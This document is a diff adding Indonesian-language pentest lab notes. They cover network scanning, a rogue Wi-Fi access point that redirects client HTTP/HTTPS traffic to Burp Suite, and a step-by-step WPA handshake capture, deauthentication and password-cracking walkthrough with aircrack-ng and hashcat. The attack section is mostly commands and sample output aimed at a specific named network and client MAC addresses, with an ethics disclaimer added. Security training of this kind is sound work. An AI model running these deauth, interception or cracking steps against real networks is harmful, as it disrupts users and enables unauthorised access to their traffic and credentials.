@@ -10550,6 +10550,1262 @@ DIFFICULTY:       Mudah            Medium            Sulit
 DANGER LEVEL:     Rendah (Lab)     Tinggi (Real)     Kritis (Defense)
 ```
 
+
+notepad.exe "$env:USERPROFILE\.wslconfig"
+notepad.exe "C:\Users\VICTUS\.wslconfig"
+
+[wsl2]
+networkingMode=mirrored
+dnsTunneling=true
+wsl --shutdown
+
+VMWARE
+Settings → Network Adapter
+Pilih:
+☑ Bridged: Connected directly to the physical network
+☑ Replicate physical network connection state
+
+
+VIRTUALBOX
+Settings → Network → Adapter 1
+
+Set:
+Enable Network Adapter ☑
+Attached to: Bridged Adapter
+Name: Wi-Fi / Ethernet (yang aktif)
+Promiscuous Mode: Allow All
+
+#########################
+
+
+# Full network audit (seperti Fing)
+
+ip route | grep default
+ip neigh show
+sudo arp-scan --localnet
+sudo nmap -sn 192.168.60.0/24
+sudo nmap -A -T4 192.168.60.1
+nmap -sn 192.168.60.0/24
+
+# Atau gunakan arp-scan
+sudo apt install arp-scan -y
+sudo arp-scan --localnet
+
+# Lihat ARP table
+ip neigh show
+
+# Download dari website
+wget https://github.com/angryip/ipscan/releases/download/3.9.1/ipscan_3.9.1_amd64.deb
+sudo dpkg -i ipscan_3.9.1_amd64.deb
+
+# Atau install via snap
+sudo snap install angry-ip-scanner
+
+sudo apt install arp-scan -y
+
+# Scan local network
+sudo arp-scan --localnet
+
+# Scan specific subnet
+sudo arp-scan 192.168.60.0/24
+
+sudo apt install netdiscover -y
+
+# Passive scan
+sudo netdiscover -r 192.168.60.0/24
+
+# Active scan
+sudo netdiscover -i eth0
+
+sudo apt install zenmap -y
+
+# Run GUI
+sudo zenmap
+
+sudo apt install masscan -y
+
+# Scan super cepat
+sudo masscan 192.168.60.0/24 -p0-65535 --rate=10000
+
+sudo apt install fping -y
+
+# Ping multiple hosts
+fping -a -g 192.168.60.0/24 2>/dev/null
+
+# Dengan statistik
+fping -s -g 192.168.60.1 192.168.60.254
+
+# Via AppImage
+wget https://github.com/robinsmidsrod/LANs/releases/latest
+chmod +x lanscan.AppImage
+./lanscan.AppImage
+
+sudo apt install net-tools -y
+
+# ARP table
+arp -a
+
+# Network interfaces
+ifconfig -a
+
+# Routing table
+route -n
+
+sudo apt install bettercap
+sudo bettercap
+bettercap -iface eth5
+bettercap -iface eth7
+net.probe on
+net.show
+
+#################################
+
+Windows netsh portproxy
+Jalankan CMD / PowerShell as Administrator
+
+netsh interface portproxy add v4tov4 `
+listenaddress=0.0.0.0 listenport=2222 `
+connectaddress=192.168.1.50 connectport=2222
+192.168.1.50 = IP VM
+
+netsh advfirewall firewall add rule `
+name="Forward 2222 to VM" `
+dir=in action=allow protocol=TCP localport=2222
+
+
+################################
+### Tujuan
+Mahasiswa mampu:
+- Membuat Access Point (AP) di Kali Linux
+- Membagikan internet (NAT)
+- Membelokkan trafik HTTP/HTTPS ke Burp Suite
+- Memahami perbedaan HTTP, HTTPS, QUIC
+- Mengetahui limitasi Android Chrome
+
+
+CHIPSET TL-WN722N DI WINDOWS
+🔹 CARA 1 — lewat Device Manager (PALING AKURAT)
+
+1️⃣ Colokkan TL-WN722N ke USB
+2️⃣ Klik kanan Start → Device Manager
+3️⃣ Buka Network adapters
+4️⃣ Cari adaptor TP-Link / Wireless USB
+5️⃣ Klik kanan → Properties
+6️⃣ Tab Details
+7️⃣ Pada Property, pilih Hardware Ids
+USB\VID_0CF3&PID_9271
+
+DI KALI LINUX
+Di VMware Workstation:
+
+Menu atas VM
+Removable Devices
+
+Cari:
+TP-Link TL-WN722N
+atau
+Atheros AR9271
+
+Klik:
+Connect (Disconnect from Host)
+Kalau masih tertulis Connect to Host
+→ berarti SALAH, USB belum masuk VM
+
+modprobe ath9k_htc
+dmesg | grep ath
+iwconfig
+airmon-ng start wlan0
+
+#### SET UP AP PROXY BURPSUITE
+Client (HP / VM)
+        |
+     Wi-Fi
+        |
+   Kali Linux
+  (hostapd)
+        |
+   iptables REDIRECT
+        |
+   Burp Suite :8080
+
+iw dev
+airmon-ng stop wlan0mon
+
+ip link set wlan0 down
+iw dev wlan0 set type managed
+ip link set wlan0 up
+
+apt update
+apt install -y hostapd dnsmasq iptables-persistent
+
+### KONFIGURASI ACCESS POINT (hostapd)
+## /etc/hostapd/hostapd.conf
+interface=wlan0
+driver=nl80211
+ssid=LAB-PROXY
+hw_mode=g
+channel=1
+country_code=US
+ieee80211d=1
+ieee80211n=0
+wmm_enabled=0
+auth_algs=1
+ignore_broadcast_ssid=0
+
+nano /etc/default/hostapd
+DAEMON_CONF="/etc/hostapd/hostapd.conf"
+
+DNS AGAR CLIENT BISA BROWSING
+mv /etc/dnsmasq.conf /etc/dnsmasq.conf.bak
+nano /etc/dnsmasq.conf
+interface=wlan0
+bind-interfaces
+dhcp-range=10.10.0.10,10.10.0.100,255.255.255.0,12h
+dhcp-option=3,10.10.0.1
+dhcp-option=6,8.8.8.8,1.1.1.1
+dhcp-authoritative
+
+
+
+ip addr add 10.10.0.1/24 dev wlan0
+sysctl -w net.ipv4.ip_forward=1
+echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
+
+systemctl unmask hostapd
+
+systemctl start hostapd
+systemctl start dnsmasq
+
+NAT: BAGIKAN INTERNET KE CLIENT (INI YANG SERING KURANG)
+iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+
+
+systemctl stop hostapd
+hostapd -dd /etc/hostapd/hostapd.conf
+
+Jalankan Burp Suite
+
+- Proxy Listener: `0.0.0.0:8080`
+- Enable **Support invisible proxying**
+
+
+http://burp download ca
+
+test: http://neverssl.com
+
+
+### STELL ULANG IP TABLES
+
+ip addr flush dev wlan0
+ip link set wlan0 up
+ip addr add 10.10.0.1/24 dev wlan0
+
+iptables -F
+iptables -t nat -F
+iptables -t mangle -F
+iptables -X
+
+systemctl start NetworkManager
+systemctl enable NetworkManager
+
+
+# SSH SAFE
+iptables -I INPUT -p tcp --dport 22 -j ACCEPT
+iptables -I OUTPUT -p tcp --sport 22 -j ACCEPT
+
+# NAT internet sharing
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+# forward
+iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+
+# redirect ke Burp
+iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+ip link set wlan0 down
+iw dev wlan0 set type managed
+ip link set wlan0 up
+
+nmcli device set wlan0 managed no
+
+iw reg set US
+iw reg get
+
+ip link set wlan0 down
+iw dev wlan0 set type __ap
+ip link set wlan0 up
+iw dev
+
+unmanaged → urusan NetworkManager
+type __ap → urusan driver/kernel (nl80211)
+
+nmcli device set wlan0 managed no
+
+Artinya:
+         NetworkManager LEPAS TANGAN
+         NM tidak:
+         scan Wi-Fi
+         connect
+         ubah mode
+         ambil DHCP
+         Supaya tidak konflik dengan hostapd
+
+Kalau selesai lab, mau balik normal Wi-Fi client:
+ip link set wlan0 down
+iw dev wlan0 set type managed
+ip link set wlan0 up
+nmcli device set wlan0 managed yes
+
+
+### wireshark
+
+[ Karyawan ]
+   |
+[ Switch / WiFi AP ]
+   |
+[ Router / Firewall / Kali / IDS ]  ← monitoring
+   |
+[ Internet ]
+
+
+tcpdump -i eth0 -w kantor-full.pcap
+capinfos kantor-full.pcap
+
+LIHAT ISI CEPAT (TANPA GUI)
+
+tcpdump -r kantor-full.pcap | head
+tcpdump -r kantor-full.pcap | awk '{print $2}' | sort | uniq -c
+
+A — Ambil HANYA DNS
+tcpdump -r kantor-full.pcap -w dns-only.pcap port 53
+
+B — Ambil HANYA HTTP
+tcpdump -r kantor-full.pcap -w http-only.pcap tcp port 80
+
+C — Ambil HANYA HTTPS (TLS)
+tcpdump -r kantor-full.pcap -w tls-only.pcap tcp port 443
+
+CLEANSING PER IP
+tcpdump -r kantor-full.pcap -w device-63.197.pcap host 192.168.63.197
+tcpdump -r kantor-full.pcap -w subnet-60-22.pcap net 192.168.60.0/22
+
+tcpdump -tttt -r kantor-full.pcap | head
+editcap -A "2026-01-06 09:00:00" -B "2026-01-06 17:00:00" kantor-full.pcap jam-kerja.pcap
+
+IDENTIFIKASI DEVICE (MAC & VENDOR)
+tcpdump -e -r kantor-full.pcap | head
+
+IP PC (HOST)
+IPv4 Address     : 192.168.60.42
+Subnet Mask      : 255.255.252.0  (/22)
+Default Gateway  : 192.168.60.1
+
+IP Kali
+eth0 : 192.168.62.19/22
+wlan0: 10.10.0.1/24
+
+##Sekendala jaringan manual (Windows – contoh):
+####kendal network dari vm ke host dan antar jaringan sesama
+
+sudo systemctl restart NetworkManager
+
+nmcli device disconnect eth0
+nmcli device connect eth0
+
+vmware run as Administrator
+Settings -> network -> vmnet8
+
+nmcli connection delete "Wired connection 1"
+nmcli connection add type ethernet ifname eth0 con-name eth0-dhcp ipv4.method auto
+nmcli connection up eth0-dhcp
+nmcli connection up eth0-dhcp
+
+
+
+### aircrack ng
+
+Client <---> Access Point
+   |              |
+   +-- M1 --------+  (AP kirim ANONCE)
+   +-- M2 ------->+  (Client kirim SNONCE + MIC)
+   +<-- M3 -------+  (AP kirim GTK + MIC)
+   +-- M4 ------->+  (Client confirm)
+
+####Enable Monitor Mode
+nmcli dev wifi list
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+jika error: 
+
+Requested device "wlan0" does not exist.
+Run /usr/sbin/airmon-ng without any arguments to see available interfaces
+sudo airmon-ng stop wlan0mon
+# Cek lagi
+iwconfig
+# Start monitor mode
+sudo airmon-ng start wlan0
+
+#### scan wifi
+timeout 15 sudo airodump-ng wlan0mon
+
+```
+ 34:8A:12:AE:A1:84  -62        7      101    0   1  130   WPA3 CCMP   SAE  TSC - System 7
+```
+
+copy BSSID - Capture Handshake - Target TSC System 7
+
+sudo airodump-ng -c 1 --bssid 34:8A:12:AE:A1:84 -w /tmp/handshake-tsc-system7 wlan0mon
+Hasil: /tmp/handshake-tsc-system7-01.cap (airodump tetap tambah -01.cap)
+
+sudo airodump-ng -c 1 --bssid 34:3A:20:94:F5:C2 -w /tmp/handshake wlan0mon
+sudo airodump-ng -c 11 --bssid 34:3A:20:94:F5:C2 -w /tmp/capture wlan0mon
+sudo airodump-ng -c 11 --bssid  34:3A:20:94:F5:C2 -w /tmp/capture wlan0mon
+
+STEP 4: Deauth Client (Terminal SSH Baru)
+
+```
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 34:8A:12:AE:A1:84  -63  97     1059      767   61   1  130   WPA3 CCMP   SAE  TSC - System 7
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ 34:8A:12:AE:A1:84  00:C3:0A:17:8D:8D  -40   12e-24   5608      554  PMKID -> INI PENTING
+
+```
+# Ganti MAC client dari step 3
+sudo aireplay-ng --deauth 10 -a 34:8A:12:AE:A1:84 -c 00:C3:0A:17:8D:8D wlan0mon
+sudo aireplay-ng --deauth 10 -a 34:3A:20:94:F5:C2 -c 00:C3:0A:17:8D:8D wlan0mon
+sudo aireplay-ng --deauth 10 -a 34:8A:12:AE:A1:84 wlan0mon
+sudo aireplay-ng --deauth 10 -a 34:3A:20:94:F5:C2 wlan0mon
+
+aircrack-ng /tmp/handshake-01.cap
+
+
+# Extract hash ke format hashcat
+hcxpcapngtool -o /tmp/hash.hc22000 /tmp/handshake-01.cap
+
+# Lihat isi hash
+cat /tmp/hash.hc22000
+
+# Install tshark
+sudo apt install tshark -y
+
+# Lihat paket EAPOL (handshake)
+tshark -r /tmp/handshake-01.cap -Y "eapol"
+
+# Lihat detail M2 dari set pertama (packet 418)
+tshark -r /tmp/handshake-01.cap -Y "frame.number == 418" -V | grep -A5 -E "Nonce|MIC"
+
+    WPA Key Nonce: fb263fe6040ce65f536ca15c47dc23b95f400aa141d15efdd6f401c080ca88aa
+    Key IV: 00000000000000000000000000000000
+    WPA Key RSC: 0000000000000000
+    WPA Key ID: 0000000000000000
+    WPA Key MIC: 43045e768cf04abaf22837ba47d187e5
+    WPA Key Data Length: 28
+    WPA Key Data: 301a0100000fac040100000fac040100000fac0280000000000fac06
+        Tag: RSN Information
+            Tag Number: RSN Information (48)
+            Tag length: 26
+
+cd /tmp
+cat > common-id.txt << 'EOF'
+12345678
+password
+admin123
+adminadmin
+password123
+qwerty123
+admin
+password1
+123456
+12345
+EOF
+
+sudo aircrack-ng /tmp/handshake-01.cap -w /tmp/common-id.txt
+
+hashcat -m 22000 /tmp/hash.hc22000 /tmp/common-id.txt --force
+
+
+---
+
+## 📚 PENJELASAN LENGKAP AIRCRACK-NG SUITE
+
+### ⚠️ DISCLAIMER & ETIKA
+
+**PENTING - BACA SEBELUM PRAKTIK:**
+```
+✅ BOLEH:
+- Testing pada WiFi milik sendiri
+- Lab environment dengan izin eksplisit
+- Educational purpose dalam lingkungan terkontrol
+- Simulasi untuk memahami cara kerja WPA/WPA2
+
+❌ DILARANG:
+- Menyerang WiFi orang lain tanpa izin
+- Mengakses jaringan tanpa otorisasi
+- Menggunakan untuk tujuan illegal
+- Mencuri data atau informasi pribadi
+
+HUKUM: UU ITE Pasal 30, ancaman pidana 6-12 tahun penjara
+```
+
+---
+
+## 🔧 TOOLS DALAM AIRCRACK-NG SUITE
+
+### 1. **airmon-ng** - Monitor Mode Manager
+Fungsi: Mengubah wireless adapter ke mode monitor (promiscuous mode)
+
+### 2. **airodump-ng** - Packet Capture Tool
+Fungsi: Menangkap paket wireless (beacon, data, handshake)
+
+### 3. **aireplay-ng** - Packet Injection Tool
+Fungsi: Inject paket untuk deauthentication atau replay attacks
+
+### 4. **aircrack-ng** - Password Cracking Tool
+Fungsi: Crack password WEP/WPA/WPA2 dari captured handshake
+
+---
+
+## 📖 STEP-BY-STEP PRAKTIK LENGKAP
+
+### **STEP 1: CEK WIRELESS ADAPTER**
+
+```bash
+# Lihat semua interface jaringan
+iwconfig
+```
+
+**Output yang diharapkan:**
+```
+wlan0     IEEE 802.11  ESSID:off/any  
+          Mode:Managed  Access Point: Not-Associated   
+          Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+```
+
+**Penjelasan:**
+- `wlan0` = nama wireless interface Anda
+- `Mode:Managed` = mode normal (client)
+- Jika tidak ada `wlan0`, coba `wlan1`, `wlan2`, atau jalankan `ip link` untuk melihat semua interface
+
+---
+
+### **STEP 2: AKTIFKAN MONITOR MODE**
+
+#### Command 1: Kill Process yang Mengganggu
+```bash
+sudo airmon-ng check kill
+```
+
+**Penjelasan Flag:**
+- `check kill` = Stop semua process yang bisa mengganggu monitor mode
+- Process yang di-kill: NetworkManager, wpa_supplicant, dhclient
+
+**Output:**
+```
+Killing these processes:
+  PID Name
+  1234 NetworkManager
+  5678 wpa_supplicant
+```
+
+⚠️ **Konsekuensi:** WiFi normal akan mati, tidak bisa browsing sampai mode normal dikembalikan
+
+---
+
+#### Command 2: Start Monitor Mode
+```bash
+sudo airmon-ng start wlan0
+```
+
+**Penjelasan Flag:**
+- `start` = Aktifkan monitor mode
+- `wlan0` = Interface yang akan diubah ke monitor mode
+
+**Output yang diharapkan:**
+```
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           ath9k_htc       Qualcomm Atheros AR9271
+
+                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+```
+
+**Interface baru:**
+- `wlan0mon` = Interface monitor mode (bukan `wlan0` lagi!)
+
+---
+
+#### Command 3: Verifikasi Monitor Mode
+```bash
+iwconfig
+```
+
+**Output yang benar:**
+```
+wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm
+```
+
+✅ **SUKSES:** Jika tertulis `Mode:Monitor`
+
+---
+
+### **STEP 3: SCAN WIFI ACCESS POINTS**
+
+```bash
+sudo airodump-ng wlan0mon
+```
+
+**Penjelasan Flag:**
+- `wlan0mon` = Interface monitor mode yang akan digunakan untuk scanning
+- Tidak ada flag tambahan = scan semua channel (1-14) secara bergantian
+
+**Atau dengan timeout (auto stop setelah 15 detik):**
+```bash
+timeout 15 sudo airodump-ng wlan0mon
+```
+
+---
+
+**Output Penjelasan (Contoh Real):**
+
+```
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC  CIPHER  AUTH ESSID
+ 
+ 34:8A:12:AE:A1:84  -62       7      101    0   1  130   WPA2 CCMP   PSK  TSC - System 7
+ AA:BB:CC:DD:EE:FF  -45      89       45    2   6  130   WPA2 CCMP   PSK  TP-Link_Home
+ 11:22:33:44:55:66  -78      12        0    0  11   54   WPA2 CCMP   PSK  Guest-WiFi
+```
+
+**Penjelasan Kolom:**
+
+| Kolom | Arti | Contoh | Penjelasan |
+|-------|------|--------|------------|
+| **BSSID** | MAC Address AP | `34:8A:12:AE:A1:84` | Identifier unik access point |
+| **PWR** | Signal Strength | `-62` | Semakin dekat ke 0, semakin kuat (-30=sangat kuat, -90=sangat lemah) |
+| **Beacons** | Beacon Packets | `7` | Jumlah beacon frame (broadcast SSID) |
+| **#Data** | Data Packets | `101` | Jumlah data packets (indikator aktivitas) |
+| **#/s** | Packets per Second | `0` | Kecepatan packet saat ini |
+| **CH** | Channel | `1` | Channel WiFi (1-14 untuk 2.4GHz, 36-165 untuk 5GHz) |
+| **MB** | Max Speed | `130` | Kecepatan maksimal dalam Mbps |
+| **ENC** | Encryption | `WPA2` | Jenis enkripsi (WEP/WPA/WPA2/WPA3) |
+| **CIPHER** | Cipher Type | `CCMP` | Algoritma enkripsi (CCMP=AES, TKIP=RC4) |
+| **AUTH** | Authentication | `PSK` | Method autentikasi (PSK=Pre-Shared Key, MGT=Enterprise) |
+| **ESSID** | Network Name | `TSC - System 7` | Nama WiFi yang terlihat |
+
+---
+
+**Bagian Bawah Output (Connected Clients):**
+
+```
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+ 
+ 34:8A:12:AE:A1:84  00:C3:0A:17:8D:8D  -40  12e-24   5608      554         iPhone-John
+ 34:8A:12:AE:A1:84  A8:5E:45:12:34:56  -55  24e-24      0      123         Samsung-S21
+```
+
+**Penjelasan Kolom Client:**
+
+| Kolom | Arti | Penjelasan |
+|-------|------|------------|
+| **BSSID** | MAC AP | Access point yang terhubung |
+| **STATION** | MAC Client | MAC address device yang terkoneksi |
+| **PWR** | Signal | Kekuatan sinyal client ke AP |
+| **Rate** | Speed | `12e` = 12Mbps upload, `24` = 24Mbps download |
+| **Lost** | Packet Loss | Jumlah paket yang hilang |
+| **Frames** | Total Frames | Total frame yang ditangkap dari client ini |
+| **Notes** | Special Info | PMKID, EAPOL, atau info khusus |
+| **Probes** | Probe Request | WiFi yang pernah dicari oleh device ini |
+
+---
+
+### **STEP 4: CAPTURE HANDSHAKE (TARGET SPESIFIK)**
+
+**Pilih target dari hasil scan:**
+- BSSID: `34:8A:12:AE:A1:84`
+- Channel: `1`
+- ESSID: `TSC - System 7`
+
+```bash
+sudo airodump-ng -c 1 --bssid 34:8A:12:AE:A1:84 -w /tmp/handshake wlan0mon
+```
+
+**Penjelasan Flag Detail:**
+
+| Flag | Nilai | Fungsi |
+|------|-------|--------|
+| `-c 1` | Channel 1 | Fokus hanya pada channel 1 (tidak hop channel lagi) |
+| `--bssid` | MAC target | Hanya capture paket dari AP spesifik ini |
+| `-w /tmp/handshake` | Output file | Simpan capture ke `/tmp/handshake-01.cap` |
+| `wlan0mon` | Interface | Interface monitor mode yang digunakan |
+
+**File Output:**
+```
+/tmp/handshake-01.cap       # File capture utama (pcap format)
+/tmp/handshake-01.csv       # Data dalam format CSV
+/tmp/handshake-01.kismet.csv # Format untuk Kismet
+/tmp/handshake-01.kismet.netxml # Format XML
+```
+
+**⚠️ PENTING:** Airodump otomatis menambahkan `-01.cap`, bukan `.cap` saja!
+
+---
+
+**Output Capture Mode:**
+```
+ CH  1 ][ Elapsed: 1 min ][ 2026-01-07 20:15
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC  CIPHER  AUTH ESSID
+
+ 34:8A:12:AE:A1:84  -63  97     1059      767   61   1  130   WPA2 CCMP   PSK  TSC - System 7
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ 34:8A:12:AE:A1:84  00:C3:0A:17:8D:8D  -40  12e-24   5608      554  EAPOL  iPhone-John
+```
+
+**Indikator Sukses:**
+- ✅ **`EAPOL`** muncul di kolom Notes = Handshake terdeteksi!
+- ✅ **`#Data > 0`** dan terus bertambah = Ada aktivitas
+- ✅ **Client terlihat** = Ada device yang terkoneksi
+
+---
+
+### **STEP 5: DEAUTHENTICATION ATTACK (FORCE HANDSHAKE)**
+
+**Buka terminal baru (SSH atau tab baru), jangan stop airodump!**
+
+#### **Metode 1: Deauth Spesifik Client (Recommended)**
+```bash
+sudo aireplay-ng --deauth 10 -a 34:8A:12:AE:A1:84 -c 00:C3:0A:17:8D:8D wlan0mon
+```
+
+**Penjelasan Flag:**
+
+| Flag | Nilai | Fungsi |
+|------|-------|--------|
+| `--deauth 10` | 10 packets | Kirim 10 deauth packets (putus koneksi) |
+| `-a` | BSSID AP | MAC address Access Point target |
+| `-c` | MAC Client | MAC address client spesifik yang akan di-kick |
+| `wlan0mon` | Interface | Interface monitor untuk inject packets |
+
+**Kapan Gunakan:**
+- Ketika hanya ingin deauth 1 client spesifik
+- Lebih etis (tidak ganggu semua orang)
+- Client langsung reconnect = capture handshake
+
+---
+
+#### **Metode 2: Deauth Broadcast (All Clients)**
+```bash
+sudo aireplay-ng --deauth 10 -a 34:8A:12:AE:A1:84 wlan0mon
+```
+
+**Perbedaan:**
+- Tidak ada flag `-c` = semua client akan di-kick
+- Lebih agresif, semua orang putus koneksi
+- ⚠️ Lebih mudah terdeteksi dan tidak etis untuk WiFi publik
+
+---
+
+**Output Deauth:**
+```
+20:15:23  Waiting for beacon frame (BSSID: 34:8A:12:AE:A1:84) on channel 1
+20:15:23  Sending 64 directed DeAuth (code 7). STMAC: [00:C3:0A:17:8D:8D] [23|61 ACKs]
+```
+
+**Apa yang Terjadi:**
+1. Client (iPhone) menerima fake deauth packet
+2. Client pikir AP memutuskan koneksi
+3. Client otomatis reconnect ke AP
+4. Saat reconnect → **4-Way Handshake terjadi**
+5. Airodump menangkap handshake tersebut
+
+---
+
+### **STEP 6: VERIFIKASI HANDSHAKE BERHASIL**
+
+**Kembali ke terminal airodump, cari di pojok kanan atas:**
+
+```
+ CH  1 ][ Elapsed: 2 min ][ 2026-01-07 20:16 ][ WPA handshake: 34:8A:12:AE:A1:84
+```
+
+✅ **SUKSES:** Jika muncul `WPA handshake: <BSSID>`
+
+---
+
+**Atau verifikasi manual dengan aircrack-ng:**
+```bash
+aircrack-ng /tmp/handshake-01.cap
+```
+
+**Output jika handshake valid:**
+```
+Opening /tmp/handshake-01.cap
+Read 1234 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  34:8A:12:AE:A1:84  TSC - System 7           WPA (1 handshake)
+
+Choosing first network as target.
+```
+
+✅ **`WPA (1 handshake)`** = Handshake berhasil ditangkap!
+
+---
+
+### **STEP 7: CRACK PASSWORD (DICTIONARY ATTACK)**
+
+#### **Buat Wordlist Sederhana (untuk Demo):**
+```bash
+cd /tmp
+cat > common-id.txt << 'EOF'
+12345678
+password
+admin123
+adminadmin
+password123
+qwerty123
+admin
+password1
+123456
+12345
+testtest
+welcome123
+letmein
+monkey123
+abc123
+EOF
+```
+
+**Penjelasan:**
+- Wordlist = daftar password yang akan dicoba
+- Real-world: gunakan wordlist besar seperti `rockyou.txt` (14jt passwords)
+- Lokasi rockyou: `/usr/share/wordlists/rockyou.txt.gz`
+
+---
+
+#### **Crack Menggunakan Aircrack-ng:**
+```bash
+sudo aircrack-ng /tmp/handshake-01.cap -w /tmp/common-id.txt
+```
+
+**Penjelasan Flag:**
+
+| Flag | Nilai | Fungsi |
+|------|-------|--------|
+| `/tmp/handshake-01.cap` | File capture | File yang berisi handshake |
+| `-w` | Wordlist path | File dictionary untuk brute force |
+
+---
+
+**Output Proses Cracking:**
+```
+Opening /tmp/handshake-01.cap
+Read 1234 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  34:8A:12:AE:A1:84  TSC - System 7           WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening /tmp/common-id.txt
+Read 15 passwords.
+
+Tested 5 keys (1 seconds per key)
+
+                         KEY FOUND! [ password123 ]
+
+Master Key     : AB CD EF 12 34 56 78 90 AB CD EF 12 34 56 78 90
+                 AB CD EF 12 34 56 78 90 AB CD EF 12 34 56 78 90
+
+Transient Key  : 12 34 56 78 90 AB CD EF 12 34 56 78 90 AB CD EF
+                 12 34 56 78 90 AB CD EF 12 34 56 78 90 AB CD EF
+                 ...
+```
+
+✅ **SUKSES:** `KEY FOUND! [ password123 ]`
+
+---
+
+**Jika Password TIDAK DITEMUKAN:**
+```
+                         KEY NOT FOUND
+
+Tested 15 keys (0 seconds per key)
+```
+
+**Solusi:**
+- Gunakan wordlist lebih besar
+- Coba kombinasi dengan rules (mangling)
+- Gunakan hashcat untuk GPU acceleration
+
+---
+
+### **STEP 8: CRACK DENGAN HASHCAT (ADVANCED - GPU)**
+
+#### **Convert Format untuk Hashcat:**
+```bash
+# Install tools
+sudo apt install hcxtools -y
+
+# Convert ke format hashcat
+hcxpcapngtool -o /tmp/hash.hc22000 /tmp/handshake-01.cap
+```
+
+**Penjelasan:**
+- `hcxpcapngtool` = Converter dari pcap ke format hashcat
+- `-o /tmp/hash.hc22000` = Output file format 22000 (WPA-PMKID-PBKDF2-HMAC-SHA1)
+- Format 22000 = Format baru hashcat untuk WPA/WPA2
+
+---
+
+#### **Lihat Isi Hash:**
+```bash
+cat /tmp/hash.hc22000
+```
+
+**Output:**
+```
+WPA*02*4d4fe7aac3a2cecab9e87f0d16c*348a12aea184*00c30a178d8d*545343202d2053797374656d2037***
+```
+
+**Format Hash Explained:**
+```
+WPA*02*PMKID*AP_MAC*CLIENT_MAC*ESSID(hex)*empty*empty*
+```
+
+---
+
+#### **Crack dengan Hashcat:**
+```bash
+hashcat -m 22000 /tmp/hash.hc22000 /tmp/common-id.txt --force
+```
+
+**Penjelasan Flag:**
+
+| Flag | Nilai | Fungsi |
+|------|-------|--------|
+| `-m 22000` | Hash mode | Mode untuk WPA-PBKDF2-PMKID+EAPOL |
+| `/tmp/hash.hc22000` | Hash file | File hash hasil convert |
+| `/tmp/common-id.txt` | Wordlist | Dictionary attack |
+| `--force` | Force run | Jalankan meski warning (untuk VM/WSL) |
+
+---
+
+**Output Hashcat:**
+```
+hashcat (v6.2.6) starting...
+
+OpenCL API (OpenCL 3.0) - Platform #1 [Intel(R) Corporation]
+================================================================
+* Device #1: Intel(R) Graphics, 6400/12800 MB, 96MCU
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+
+Hashfile '/tmp/hash.hc22000' on line 1 (WPA*02*...): Separator unmatched
+No hashes loaded.
+```
+
+⚠️ **Jika error:** Capture mungkin tidak valid atau format salah
+
+---
+
+**Jika Sukses:**
+```
+WPA*02*4d4fe7aac3a2cecab9e87f0d16c*...:password123
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
+Hash.Target......: /tmp/hash.hc22000
+Time.Started.....: Tue Jan 07 20:20:15 2026 (2 secs)
+Speed.#1.........:    50000 H/s
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 15/15 (100.00%)
+```
+
+---
+
+### **STEP 9: ANALISIS HANDSHAKE DENGAN WIRESHARK/TSHARK**
+
+#### **Install Tshark:**
+```bash
+sudo apt install tshark -y
+```
+
+---
+
+#### **Lihat Paket EAPOL (Handshake):**
+```bash
+tshark -r /tmp/handshake-01.cap -Y "eapol"
+```
+
+**Penjelasan Flag:**
+
+| Flag | Fungsi |
+|------|--------|
+| `-r` | Read dari file capture |
+| `-Y "eapol"` | Display filter untuk EAPOL packets (handshake) |
+
+---
+
+**Output:**
+```
+  418   2.457891 00:c3:0a:17:8d:8d → 34:8a:12:ae:a1:84 EAPOL 155 Key (Message 2 of 4)
+  419   2.458234 34:8a:12:ae:a1:84 → 00:c3:0a:17:8d:8d EAPOL 211 Key (Message 3 of 4)
+  420   2.458890 00:c3:0a:17:8d:8d → 34:8a:12:ae:a1:84 EAPOL 123 Key (Message 4 of 4)
+```
+
+**4-Way Handshake Explained:**
+- **Message 1:** AP → Client (AP Nonce)
+- **Message 2:** Client → AP (Client Nonce + MIC) ← **INI YANG KITA BUTUHKAN!**
+- **Message 3:** AP → Client (GTK + MIC)
+- **Message 4:** Client → AP (Confirmation)
+
+✅ Minimal butuh **Message 2 dan 3** untuk crack password!
+
+---
+
+#### **Lihat Detail Message 2:**
+```bash
+tshark -r /tmp/handshake-01.cap -Y "frame.number == 418" -V | grep -A5 -E "Nonce|MIC"
+```
+
+**Penjelasan Flag:**
+
+| Flag | Fungsi |
+|------|--------|
+| `-V` | Verbose (detail penuh) |
+| `grep -A5` | Tampilkan 5 baris setelah match |
+| `-E "Nonce\|MIC"` | Cari keyword Nonce atau MIC |
+
+---
+
